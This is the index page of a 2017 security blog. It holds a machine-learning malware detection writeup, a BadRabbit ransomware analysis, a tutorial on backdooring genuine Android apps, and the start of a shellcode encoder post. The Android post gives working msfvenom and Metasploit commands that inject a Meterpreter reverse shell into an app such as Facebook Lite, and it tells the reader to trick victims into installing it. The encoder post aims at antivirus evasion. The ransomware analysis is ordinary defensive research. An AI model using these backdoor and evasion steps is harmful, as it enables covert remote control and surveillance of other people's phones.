<!DOCTYPE html>
<html lang="en-us">

  <head>
  <link href="https://gmpg.org/xfn/11" rel="profile" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta http-equiv="content-type" content="text/html; charset=utf-8" />

  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />

  <title>
    
      Greycel &middot; Yet Another Security Blog
    
  </title>

  


  <!-- CSS -->
  <link rel="stylesheet" href="/assets/css/main.css" />
  

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Abril+Fatface" />

  <!-- Icons -->
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/favicon.png" />
<link rel="shortcut icon" href="/favicon.ico" />

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml" />

  <!-- Additional head bits without overriding original head -->
</head>


  <body class="index home">

    <div id="sidebar">
  <header>
    <h1 class="site-title">
      <a href="/">
        
        Greycel
      </a>
    </h1>
    <p class="lead"></p>
  </header>
  <nav id="sidebar-nav-links">
  
    <a class="home-link  active"
        href="/">Home</a>
  
  

  

  


  

  
    
  

  
    
  

  
    
      <a class="page-link "
          href="/about.html">About</a>
    
  

  
    
  

  

  
    
  

  
    
  

  
    
  


  


  

  
    
      <a class="category-link "
          href="/category/Malware_Analysis.html">Malware Analysis</a>
    
  

  
    
      <a class="category-link "
          href="/category/Pentest.html">Pentest</a>
    
  

  
    
  

  
    
  

  

  
    
  

  
    
  

  
    
  


  <!-- Optional additional links to insert in sidebar nav -->
</nav>


  

  <nav id="sidebar-icon-links">
  

  <a id="subscribe-link"
     class="icon" title="Subscribe" aria-label="Subscribe"
     href="/feed.xml">
    <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <circle cx="6.18" cy="17.82" r="2.18"/>
    <path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"/>
</svg>
  </a>

  
  
  
  

  
    <a id="tags-link"
       class="icon"
       title="Tags" aria-label="Tags"
       href="/tags.html">
      <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
    </a>
  

  
    <a id="search-link"
       class="icon"
       title="Search" aria-label="Search"
       href="/search.html">
      <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
    <path d="M0 0h24v24H0z" fill="none"/>
</svg>
    </a>
  

  <!-- Optional additional links to insert for icons links -->
</nav>

  <p>
  &copy; 2019.
  <a href="/LICENSE.md">MIT License.</a>
</p>

</div>

    <main class="container">
      <div class="content">
  


  

  
  <article class="post-body">
    <h2 class="post-title">
      <a href="/malware-analysis/2017/11/08/ML_0day_Detection_Blusapphire.html">
        ZeroDay Detection with Machine Learning(ML) Blusapphire
      </a>
    </h2>
    <div class="post-meta">
  <span class="post-date">08 Nov 2017</span>
  <span class="post-categories">
    
      &bull;

      
      
      

      
        <a href="/category/Malware_Analysis.html">
          Malware Analysis
        </a>
      
    
  </span>
</div>


    
      <p>Year2016 &amp; 2017 has witnessed the rise in cyber attacks targeting various sectors like banking, industrial, etc. New variants and types (fileless/in-memory) of malware families are being surfacing each day (wannacry, Petya/NotPetya/Nyetya/Goldeneye, BadRabbit, etc) which a traditional antivirus engine couldn’t detect without a signature.</p>

<p>With advancement in today’s cybercrime, there’s being advancement in detection of such potential threats, which brings me to Machine Learning (ML). According to wiki, Machine Learning (ML) is a field of computer science that gives computers the ability to learn without being explicitly programmed. In other words, computer trained to learn and identify malicious threats on its own.</p>

<p>Blusapphire is being integrated with Machine Learning (ML) engine that is capable of detecting any potential threats the moment they enter the network, making it easy to detect such sophisticated threats.</p>

<p>Last week one of our sensors has collected a file, which was flagged malicious by our Machine Learning (ML) engine. Being a zero-day, at that point in time, it has not triggered any AV flags. This post is an overview of the analysis made by Blusapphire ML engine.</p>

<hr />

<p><strong>Analyzed samples:</strong></p>

<table>
  <thead>
    <tr>
      <th>MD5 Hash</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>9d55d1c81605209fc2b537e74af9c91c</td>
      <td>PUP</td>
    </tr>
  </tbody>
</table>

<hr />

<p><strong>Analysis:</strong></p>

<p>We observed that the file was being downloaded from url “.pigcherrytoky.download”</p>

<p><img src="/public/0day01.jpg" /></p>

<p>Machine learning (ML) engine has flagged the file malicious and the file is loaded with some Anti-Debug techniques, making it difficult for debugging.</p>

<p><img src="/public/0day02.jpg" /></p>

<p>Being a zero-day, it has not triggered any AV flags, but the code within was matched over 176 known trojan malwares samples.</p>

<p><img src="/public/0day03.jpg" /></p>

<p>Malware being multipartite, it has refused to execute in pieces.</p>

<p><img src="/public/0day04.jpg" /></p>

<p>Abuse use of APIs:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">GetCommandLineA</span>
<span class="n">InitializeCriticalSection</span>
<span class="n">EnterCriticalSection</span>
<span class="n">LeaveCriticalSection</span>
<span class="n">DeleteCriticalSection</span>
<span class="n">VirtualFree</span>
<span class="n">VirtualAlloc</span>
<span class="n">TlsDetValue</span></code></pre></figure>

<p>URL Found:</p>

<p>Right after few hours the same PUP has being flagged malicious by multiple AV’s.</p>

<p><img src="/public/0day05.jpg" /></p>

<hr />

    

    
      
      
      

      
    
  </article>
  
  <article class="post-body">
    <h2 class="post-title">
      <a href="/malware-analysis/2017/10/28/BadRaddit_Blusapphire_Analysis.html">
        BadRabbit Closer Look with BluSapphire
      </a>
    </h2>
    <div class="post-meta">
  <span class="post-date">28 Oct 2017</span>
  <span class="post-categories">
    
      &bull;

      
      
      

      
        <a href="/category/Malware_Analysis.html">
          Malware Analysis
        </a>
      
    
  </span>
</div>


    
      <p>Since the outbreak of Petya/NotPetya which was surfaced in the month of June, again last week a new ransomware attack “aka BadRabbit” is making the headlines effecting machines in Ukraine, Russia, Turkey and Bulgaria.</p>

<hr />

<p><strong>Initial Attack Vector:</strong></p>

<p>Unlike Petya/NotPetya that use SMB (Eternal Blue) as the initial vector, this variant uses drive-by-download type of attack to deliver the malware (BadRabbit) that spreads via malicious websites.</p>

<h4 id="badrabbit-utilizes">BadRabbit utilizes:</h4>
<ol>
  <li>Diskcryptor to encrypt the files with selected extensions</li>
  <li>SCmanager, schtasks and rundll32.exe to invoke other components</li>
  <li>For lateral movement, it scans the local networks for SMB shares and spread via SMB</li>
  <li>Mimikatz for credential harvesting on compromised machine</li>
</ol>

<hr />

<p><strong>Analyzed samples:</strong></p>

<table>
  <thead>
    <tr>
      <th>MD5 Hash</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>fbbdc39af1139aebba4da004475e8839</td>
      <td>Adobe_Flash_Update – Dropper</td>
    </tr>
  </tbody>
  <tbody>
    <tr>
      <td>1d724f95c61f1055f0d02c2154bbccd3</td>
      <td>infpub.dat – Main DLL</td>
    </tr>
    <tr>
      <td>b4e6d97dafd9224ed9a547d52c26ce02</td>
      <td>cscc.dat – Driver for Encryption</td>
    </tr>
    <tr>
      <td>b14d8faf7f0cbcfad051cefe5f39645f</td>
      <td>dispci.exe – DiskCryptor Client</td>
    </tr>
  </tbody>
</table>

<hr />

<p><strong>Behavioral analysis:</strong></p>

<p>Once downloaded, the executable dropper pretending to an Adobe Flash Update convincing the victim to install it</p>

<p><img src="/public/bad00.jpg" /></p>

<p>Upon execution it drops the main module DLL “infpub.dat” in “C:\Windows” directory that is further initiated by rundll.exe with arguments.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">system32</span>\<span class="n">rundll32</span><span class="o">.</span><span class="n">exe</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">infpub</span><span class="o">.</span><span class="n">dat</span><span class="p">,</span><span class="c1">#1 15</span></code></pre></figure>

<p><img src="/public/bad01.jpg" /></p>

<p>Executes the command “schtasks /Delete /F /TN rhaegal” to delete any existing tasks with name “rhaegal”.</p>

<p><img src="/public/bad02.jpg" /></p>

<p>During the execution of main DLL “infpub.dat” other components  (cscc.dat, dispci.exe) responsible for encrypting are being dropped.</p>

<p><img src="/public/bad03.jpg" /></p>

<p>To launch the newly dropped components of diskcryptor “dispci.exe” on the startup, a new task is scheduled with name “rhaegal”.</p>

<p><img src="/public/bad04.jpg" /></p>

<p>New service named “cscc” is created for DiskCryptor Driver “cscc.dat”.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">ServiceName</span><span class="o">=</span><span class="n">cscc</span><span class="p">,</span><span class="n">DisplayName</span><span class="o">=</span><span class="n">Windows</span> <span class="n">Client</span> <span class="n">Side</span> <span class="n">Caching</span> <span class="n">DDriver</span><span class="p">,</span> <span class="n">BinaryPathName</span><span class="o">=</span><span class="n">cscc</span><span class="o">.</span><span class="n">dat</span></code></pre></figure>

<p><img src="/public/bad05.jpg" /></p>

<p>Schedules a task named “drogon” to forcefully reboot the machine at 04:46hrs, it appears that a reboot is required to install the DiskCryptor drivers.
<img src="/public/bad06.jpg" />
<img src="/public/bad07.jpg" /></p>

<p>BadRabbit encrypts only selected file extension as below and display ransom note.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="mi">3</span><span class="n">ds</span><span class="p">,</span> <span class="mi">7</span><span class="n">z</span><span class="p">,</span> <span class="n">accdb</span><span class="p">,</span> <span class="n">ai</span><span class="p">,</span> <span class="n">asm</span><span class="p">,</span> <span class="n">asp</span><span class="p">,</span> <span class="n">aspx</span><span class="p">,</span> <span class="n">avhd</span><span class="p">,</span> <span class="n">back</span><span class="p">,</span> <span class="n">bak</span><span class="p">,</span> <span class="n">bmp</span><span class="p">,</span> <span class="n">brw</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">cab</span><span class="p">,</span> <span class="n">cc</span><span class="p">,</span> <span class="n">cer</span><span class="p">,</span> <span class="n">cfg</span><span class="p">,</span> <span class="n">conf</span><span class="p">,</span> <span class="n">cpp</span><span class="p">,</span> <span class="n">crt</span><span class="p">,</span> <span class="n">cs</span><span class="p">,</span> <span class="n">ctl</span><span class="p">,</span> <span class="n">cxx</span><span class="p">,</span> <span class="n">dbf</span><span class="p">,</span> <span class="n">der</span><span class="p">,</span> <span class="n">dib</span><span class="p">,</span> <span class="n">disk</span><span class="p">,</span> <span class="n">djvu</span><span class="p">,</span> <span class="n">doc</span><span class="p">,</span> <span class="n">docx</span><span class="p">,</span> <span class="n">dwg</span><span class="p">,</span> <span class="n">eml</span><span class="p">,</span> <span class="n">fdb</span><span class="p">,</span> <span class="n">gz</span><span class="p">,</span> <span class="n">h</span><span class="p">,</span> <span class="n">hdd</span><span class="p">,</span> <span class="n">hpp</span><span class="p">,</span> <span class="n">hxx</span><span class="p">,</span> <span class="n">iso</span><span class="p">,</span> <span class="n">java</span><span class="p">,</span> <span class="n">jfif</span><span class="p">,</span> <span class="n">jpe</span><span class="p">,</span> <span class="n">jpeg</span><span class="p">,</span> <span class="n">jpg</span><span class="p">,</span> <span class="n">js</span><span class="p">,</span> <span class="n">kdbx</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">mail</span><span class="p">,</span> <span class="n">mdb</span><span class="p">,</span> <span class="n">msg</span><span class="p">,</span> <span class="n">nrg</span><span class="p">,</span> <span class="n">odc</span><span class="p">,</span> <span class="n">odf</span><span class="p">,</span> <span class="n">odg</span><span class="p">,</span> <span class="n">odi</span><span class="p">,</span> <span class="n">odm</span><span class="p">,</span> <span class="n">odp</span><span class="p">,</span> <span class="n">ods</span><span class="p">,</span> <span class="n">odt</span><span class="p">,</span> <span class="n">ora</span><span class="p">,</span> <span class="n">ost</span><span class="p">,</span> <span class="n">ova</span><span class="p">,</span> <span class="n">ovf</span><span class="p">,</span> <span class="n">p12</span><span class="p">,</span> <span class="n">p7b</span><span class="p">,</span> <span class="n">p7c</span><span class="p">,</span> <span class="n">pdf</span><span class="p">,</span> <span class="n">pem</span><span class="p">,</span> <span class="n">pfx</span><span class="p">,</span> <span class="n">php</span><span class="p">,</span> <span class="n">pmf</span><span class="p">,</span> <span class="n">png</span><span class="p">,</span> <span class="n">ppt</span><span class="p">,</span> <span class="n">pptx</span><span class="p">,</span> <span class="n">ps1</span><span class="p">,</span> <span class="n">pst</span><span class="p">,</span> <span class="n">pvi</span><span class="p">,</span> <span class="n">py</span><span class="p">,</span> <span class="n">pyc</span><span class="p">,</span> <span class="n">pyw</span><span class="p">,</span> <span class="n">qcow</span><span class="p">,</span> <span class="n">qcow2</span><span class="p">,</span> <span class="n">rar</span><span class="p">,</span> <span class="n">rb</span><span class="p">,</span> <span class="n">rtf</span><span class="p">,</span> <span class="n">scm</span><span class="p">,</span> <span class="n">sln</span><span class="p">,</span> <span class="n">sql</span><span class="p">,</span> <span class="n">tar</span><span class="p">,</span> <span class="n">tib</span><span class="p">,</span> <span class="n">tif</span><span class="p">,</span> <span class="n">tiff</span><span class="p">,</span> <span class="n">vb</span><span class="p">,</span> <span class="n">vbox</span><span class="p">,</span> <span class="n">vbs</span><span class="p">,</span> <span class="n">vcb</span><span class="p">,</span> <span class="n">vdi</span><span class="p">,</span> <span class="n">vfd</span><span class="p">,</span> <span class="n">vhd</span><span class="p">,</span> <span class="n">vhdx</span><span class="p">,</span> <span class="n">vmc</span><span class="p">,</span> <span class="n">vmdk</span><span class="p">,</span> <span class="n">vmsd</span><span class="p">,</span> <span class="n">vmtm</span><span class="p">,</span> <span class="n">vmx</span><span class="p">,</span> <span class="n">vsdx</span><span class="p">,</span> <span class="n">vsv</span><span class="p">,</span> <span class="n">work</span><span class="p">,</span> <span class="n">xls</span><span class="p">,</span> <span class="n">xlsx</span><span class="p">,</span> <span class="n">xml</span><span class="p">,</span> <span class="n">xvd</span><span class="p">,</span> <span class="nb">zip</span></code></pre></figure>

<p><img src="/public/bad000.jpg" /></p>

<p>Abuse use of APIs:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">CloseHandle</span>
<span class="n">CreateFileW</span>
<span class="n">CreateProcessW</span>
<span class="n">ExitProcess</span>
<span class="n">GetCommandLineW</span>
<span class="n">GetCurrentProcess</span>
<span class="n">GetFileSize</span>
<span class="n">GetModuleFileNameW</span>
<span class="n">GetModuleHandleW</span>
<span class="n">GetSystemDirectoryW</span>
<span class="n">HeapAlloc</span>
<span class="n">ReadFile</span>
<span class="n">TerminateProcess</span>
<span class="n">UnhandledExceptionFilter</span>
<span class="n">WriteFile</span></code></pre></figure>

<p>URL Found:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">rb</span><span class="o">.</span><span class="n">symcb</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">rb</span><span class="o">.</span><span class="n">crl0W</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">s</span><span class="o">.</span><span class="n">symcb</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">universal</span><span class="o">-</span><span class="n">root</span><span class="o">.</span><span class="n">crl0</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">ocsp</span><span class="o">.</span><span class="n">verisign</span><span class="o">.</span><span class="n">com0</span>
<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">verisign</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">rpa</span>
<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">verisign</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">rpa0</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">rb</span><span class="o">.</span><span class="n">symcb</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">rb</span><span class="o">.</span><span class="n">crt0</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">ts</span><span class="o">-</span><span class="n">crl</span><span class="o">.</span><span class="n">ws</span><span class="o">.</span><span class="n">symantec</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">sha256</span><span class="o">-</span><span class="n">tss</span><span class="o">-</span><span class="n">ca</span><span class="o">.</span><span class="n">crl0</span>
<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">d</span><span class="o">.</span><span class="n">symcb</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">cps0</span><span class="o">%</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">s</span><span class="o">.</span><span class="n">symcd</span><span class="o">.</span><span class="n">com06</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">crl</span><span class="o">.</span><span class="n">verisign</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">pca3</span><span class="o">-</span><span class="n">g5</span><span class="o">.</span><span class="n">crl04</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">ts</span><span class="o">-</span><span class="n">ocsp</span><span class="o">.</span><span class="n">ws</span><span class="o">.</span><span class="n">symantec</span><span class="o">.</span><span class="n">com0</span><span class="p">;</span>
<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">d</span><span class="o">.</span><span class="n">symcb</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">rpa0</span><span class="o">@</span>
<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">d</span><span class="o">.</span><span class="n">symcb</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">rpa0</span>
<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">verisign</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">cps0</span>
<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">d</span><span class="o">.</span><span class="n">symcb</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">rpa06</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">crl</span><span class="o">.</span><span class="n">thawte</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">ThawteTimestampingCA</span><span class="o">.</span><span class="n">crl0</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">s</span><span class="o">.</span><span class="n">symcd</span><span class="o">.</span><span class="n">com0</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">ocsp</span><span class="o">.</span><span class="n">thawte</span><span class="o">.</span><span class="n">com0</span>
<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">d</span><span class="o">.</span><span class="n">symcb</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">rpa0</span><span class="o">.</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">rb</span><span class="o">.</span><span class="n">symcd</span><span class="o">.</span><span class="n">com0</span><span class="o">&amp;</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">ts</span><span class="o">-</span><span class="n">crl</span><span class="o">.</span><span class="n">ws</span><span class="o">.</span><span class="n">symantec</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">tss</span><span class="o">-</span><span class="n">ca</span><span class="o">-</span><span class="n">g2</span><span class="o">.</span><span class="n">crl0</span><span class="p">(</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">sf</span><span class="o">.</span><span class="n">symcb</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">sf</span><span class="o">.</span><span class="n">crt0</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">ts</span><span class="o">-</span><span class="n">aia</span><span class="o">.</span><span class="n">ws</span><span class="o">.</span><span class="n">symantec</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">sha256</span><span class="o">-</span><span class="n">tss</span><span class="o">-</span><span class="n">ca</span><span class="o">.</span><span class="n">cer0</span><span class="p">(</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">logo</span><span class="o">.</span><span class="n">verisign</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">vslogo</span><span class="o">.</span><span class="n">gif04</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">sf</span><span class="o">.</span><span class="n">symcd</span><span class="o">.</span><span class="n">com0</span><span class="o">&amp;</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">ts</span><span class="o">-</span><span class="n">aia</span><span class="o">.</span><span class="n">ws</span><span class="o">.</span><span class="n">symantec</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">tss</span><span class="o">-</span><span class="n">ca</span><span class="o">-</span><span class="n">g2</span><span class="o">.</span><span class="n">cer0</span><span class="o">&lt;</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">sf</span><span class="o">.</span><span class="n">symcb</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">sf</span><span class="o">.</span><span class="n">crl0W</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">ts</span><span class="o">-</span><span class="n">ocsp</span><span class="o">.</span><span class="n">ws</span><span class="o">.</span><span class="n">symantec</span><span class="o">.</span><span class="n">com07</span></code></pre></figure>

<hr />

<p><strong>Lateral Movement:</strong></p>

<p>To perform credential harvesting, it creates and loads mimikatz to a file with extension “.tmp” (xxxx.tmp) in “C:\Windows\” and initiates a new process from the temp file “495E.tmp” with pipe.</p>

<p><img src="/public/bad08.jpg" />
<img src="/public/bad09.jpg" /></p>

<p>Noticed that the malware scans the local network for ports 139, 445 and spreads via SMB shares with credentials harvested using mimikatz.</p>

<p><img src="/public/bad10.jpg" />
<img src="/public/bad11.jpg" /></p>

    

    
      
      
      

      
    
  </article>
  
  <article class="post-body">
    <h2 class="post-title">
      <a href="/pentest/2017/04/28/Injecting-Backdoor-in-Android-Application.html">
        Injecting Backdoor in Android Application (APK)
      </a>
    </h2>
    <div class="post-meta">
  <span class="post-date">28 Apr 2017</span>
  <span class="post-categories">
    
      &bull;

      
      
      

      
        <a href="/category/Pentest.html">
          Pentest
        </a>
      
    
  </span>
</div>


    
      <p>Lets assuming that we have created an APK with reverse shell payload and somehow installed it on victim’s phone, which upon execution would establish a direct connection to the victim’s phone.</p>

<p>Since the generated APK only contains the payload that doesn’t do anything when clicked and even the size would be in KB’s which looks very much suspicious and the victim would uninstall it immediately or doesn’t even install it.</p>

<p>In order to make the app look legit, we would inject our meterperter reverse shell payload in genuine android apps like facebook, adobe reader, whatsapp. This way the app appears to be legit which the victim installs and gets what he expected… we get the shell..:-)</p>

<hr />

<h3 id="prerequisites">Prerequisites:</h3>
<ul>
<li>In this article, we'd be using 64bit kali linux to build our backdoored APK. Before we start make sure below listed packages are being installed in the machine, if not execute below command from the terminal:

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">apt</span><span class="o">-</span><span class="n">get</span> <span class="n">install</span> <span class="n">lib32stdc</span><span class="o">++</span><span class="mi">6</span> <span class="n">lib32ncurses5</span> <span class="n">lib32z1</span></code></pre></figure>
 </li>
<img src="/public/android01.jpg" />

<li>Apktool, this utility does come with kali linux if not check and update it. To install/update "apktool" following the instruction  <a href="https://ibotpeaches.github.io/Apktool/install/" target="_blank">@ibotpeaches</a>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">apktool</span> <span class="o">-</span><span class="n">v</span>    <span class="c1">#Check apktool version</span></code></pre></figure>
 </li>
</ul>

<hr />

<h3 id="ways-to-inject-an-android-apk-file">Ways to Inject an Android APK File</h3>

<div class="message">
Ther are different ways to inject our backdoor into an APK, we'll be using below listed utilities to build our malicious APK allowing an attacker to compromise victim's phone remotely
<ul>
<li>MSFvenom</li>
<li>Backdoor-APK</li>
</ul>
</div>

<p><strong> Injecting Payload with msfveom </strong></p>

<p>Assuming we already have a downloaded android apk, we use it as a template to inject our reverse shell. Below command would allow us to inject the backdoor into original apk, which upon execution connects back to the IP specified within the payload.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">msfvenom</span> <span class="o">--</span><span class="n">platform</span> <span class="n">android</span> <span class="o">-</span><span class="n">x</span> <span class="n">facebook_lite</span><span class="o">.</span><span class="n">apk</span> <span class="o">-</span><span class="n">p</span> <span class="n">android</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span> <span class="n">LHOST</span><span class="o">=</span><span class="mf">192.168.11.187</span> <span class="n">LPORT</span><span class="o">=</span><span class="mi">4444</span> <span class="o">-</span><span class="n">o</span> <span class="n">facebook_lite_bc</span><span class="o">.</span><span class="n">apk</span></code></pre></figure>

<p><img src="/public/fblite01.jpg" /></p>

<p>Now that we have our APK ready with the injected reverse shell payload, all you have to do is send the file to the victim and trick him to install the app.</p>

<p><img src="/public/f00.jpg" />
<img src="/public/f01.jpg" /></p>

<p>On the other hand keep the listener ready for the incoming connection using metasploit exploit/multi/handler. Once the victim installs and opens the app we would get a shell spawned.</p>

<p><img src="/public/shell01.jpg" /></p>

<hr />
<p><strong> Injecting Payload with “Backdoor-APK” </strong></p>

<p>Another utility that can be used in backdooring an android app is “Backdoor-APK”. Behind the scene, this utility uses “msfvenom” and does the same by automating the process making it much easier to inject the payload into android APK and can be downloaded from github repository.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">dana</span><span class="o">-</span><span class="n">at</span><span class="o">-</span><span class="n">cp</span><span class="o">/</span><span class="n">backdoor</span><span class="o">-</span><span class="n">apk</span><span class="o">.</span><span class="n">git</span></code></pre></figure>

<p><img src="/public/bc01.jpg" /></p>

<p>Having the downloaded Original APK and Backdoor-APK in same folder, execute the below command in the terminal which will prompt you to select the payload and details of the connect back IP and Port.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">./</span><span class="n">backdoor</span><span class="o">-</span><span class="n">apk</span><span class="o">.</span><span class="n">sh</span> <span class="n">facebook_lite</span><span class="o">.</span><span class="n">apk</span></code></pre></figure>

<p><img src="/public/bc02.jpg" /></p>

<p>Once the required details are been provided, utility start injecting the reverse shell payload within the APK.</p>

<p><img src="/public/bc03.jpg" /></p>

<p>On the other hand start the listener for incoming connection using metasploit multi handler.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span>
<span class="nb">set</span> <span class="n">payload</span> <span class="n">android</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
<span class="nb">set</span> <span class="n">lhost</span> <span class="mf">192.168.11.187</span>
<span class="nb">set</span> <span class="n">lport</span> <span class="mi">4444</span>
<span class="n">exploit</span></code></pre></figure>

<p>As expected we would have our final backdoored APK ready in “backdoor-apk -&gt; original -&gt; dist” folder, which we send to the victim and trick him to install it.</p>

<p><img src="/public/bc04.jpg" /></p>

<p>Once the victim installs and opens the app we would receive a meterpreter session.</p>

<h2><img src="/public/f02.jpg" /></h2>

<h3 id="conclusion">Conclusion</h3>

<p>Its is highly recommended to not to download and install apps from unknown sources and never enable the option “install from unkown sources” under “Setting -&gt; Security”.
Install proper antivirus and make sure you never download or click url’s from unkown sources.</p>

<hr />

    

    
      
      
      

      
    
  </article>
  
  <article class="post-body">
    <h2 class="post-title">
      <a href="/pentest/2017/04/16/Custom-Shellcode-Encoder.html">
        Custom Shellcode Encoder/Decoder (Rolling XOR)
      </a>
    </h2>
    <div class="post-meta">
  <span class="post-date">16 Apr 2017</span>
  <span class="post-categories">
    
      &bull;

      
      
      

      
        <a href="/category/Pentest.html">
          Pentest
        </a>
      
    
  </span>
</div>


    
      <p>Lets assume, you’re in middle of a penetration test and were trying to gain access to a machine with Anti-Virus installed. Unfortunatuly, on every attempt you made AV was able to identify and block you from excuting the payload making you drive crazy and frustrating…</p>

<p>Besides the fact that most of the well known encoders are been detected by modern AV and IDS products. In such scenario using of custom encoders would be handy.</p>

<div class="message">
In this article, I'd be creating a custom encoding scheme based on simple XOR Operations called Rolling XOR. this technique could be helful in evading Anti-Virus and Intrusion Detection Systems(IDS) where necessary.
</div>

<hr />

<p><strong>What is Rolling XOR Encoding Scheme..? </strong></p>

<p>This encoding scheme basically uses a radomly generated key and performs the XOR operation on the first byte in the given array and uses the result as the input(new XOR key) to perform XOR operation with the next consecutive byte and so on.</p>

<h4 id="rolling-xor-python-encoder">Rolling XOR Python Encoder</h4>

<ol>
  <li>Generates a random byte and use it as the base/key to perform the XOR operations.</li>
  <li>Places the generated XOR key as first byte in the new array “xorout_f1/f2”.</li>
